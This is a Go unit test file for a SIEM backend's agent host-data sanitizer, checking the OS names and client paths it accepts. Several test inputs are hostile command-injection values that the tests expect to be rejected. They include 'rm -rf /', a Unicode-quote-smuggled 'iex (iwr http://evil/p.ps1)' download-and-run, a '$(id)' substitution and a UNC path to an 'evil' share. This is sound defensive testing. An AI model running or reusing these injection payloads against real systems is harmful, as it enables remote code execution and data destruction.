package services

import (
    "testing"

    "siem-backend/src/modules/agents/domain/services"
    "siem-backend/tests"
)

func TestAgentHostDataSanitizerHostOs(t *testing.T) {
    agentHostDataSanitizer := services.AgentHostDataSanitizerGetInstance()

    tests.AssertEquals(t, "windows", agentHostDataSanitizer.GetHostOs("windows"))
    tests.AssertEquals(t, "darwin", agentHostDataSanitizer.GetHostOs("darwin"))
    tests.AssertEquals(t, "linux", agentHostDataSanitizer.GetHostOs("linux"))
    tests.AssertEquals(t, "", agentHostDataSanitizer.GetHostOs("Windows; rm -rf /"))
    tests.AssertEquals(t, "", agentHostDataSanitizer.GetHostOs(""))
}

func TestAgentHostDataSanitizerClientPath(t *testing.T) {
    agentHostDataSanitizer := services.AgentHostDataSanitizerGetInstance()

    tests.AssertEquals(t, `C:\programs\gosiem-client\siem-client.exe`,
        agentHostDataSanitizer.GetClientPath("windows", `C:\programs\gosiem-client\siem-client.exe`))
    tests.AssertEquals(t, `C:\Program Files (x86)\José\siem-client.exe`,
        agentHostDataSanitizer.GetClientPath("windows", `C:\Program Files (x86)\José\siem-client.exe`))
    tests.AssertEquals(t, "/opt/gosiem-client/siem-client",
        agentHostDataSanitizer.GetClientPath("linux", "/opt/gosiem-client/siem-client"))

    // comilla tipografica U+2019: PowerShell la toma como comilla simple
    tests.AssertEquals(t, "",
        agentHostDataSanitizer.GetClientPath("windows", "C:\\x\\y\u2019; iex (iwr http://evil/p.ps1); \u2019"))
    tests.AssertEquals(t, "", agentHostDataSanitizer.GetClientPath("windows", `C:\x\y'; calc; '`))
    tests.AssertEquals(t, "", agentHostDataSanitizer.GetClientPath("windows", `\\evil\share\siem-client.exe`))
    tests.AssertEquals(t, "", agentHostDataSanitizer.GetClientPath("linux", "/opt/x'$(id)'/siem-client"))
    tests.AssertEquals(t, "", agentHostDataSanitizer.GetClientPath("linux", "relative/siem-client"))
    // la ruta tiene que ser del SO informado
    tests.AssertEquals(t, "", agentHostDataSanitizer.GetClientPath("linux", `C:\programs\gosiem-client\siem-client.exe`))
    tests.AssertEquals(t, "", agentHostDataSanitizer.GetClientPath("windows", "/opt/gosiem-client/siem-client"))
}
